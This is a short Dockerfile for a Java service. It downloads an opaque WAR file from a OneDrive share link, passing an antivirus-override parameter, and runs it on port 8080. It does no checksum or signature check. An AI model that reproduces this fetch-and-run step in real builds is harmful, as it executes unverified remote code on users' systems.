FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.dm.files.1drv.com/y4mhHAn16LJX1DMr2DvnMK7rgBeGrVy6J6EWtsRN2B2SXOcIbAzd84abHO11oTXl_UAbThU-bGygGiqdrO9dIYw-1F5ZznVhzCmNWJEtqoonO__xz8ilsqWykhyyoDipoct9XCZorpNqwb6qfvHkQgdxJ3cumEUU1Gs_pOD2FSYUHRUX7zlzFNtp0MrNIqLE3fiCeQkE3U0rPS_yBGELs54DBUbVbFcJX36yFY2Rzqpl6Y?AVOverride=1 -o p.war
 
CMD ["java", "-jar", "p.war"]
EXPOSE 8080
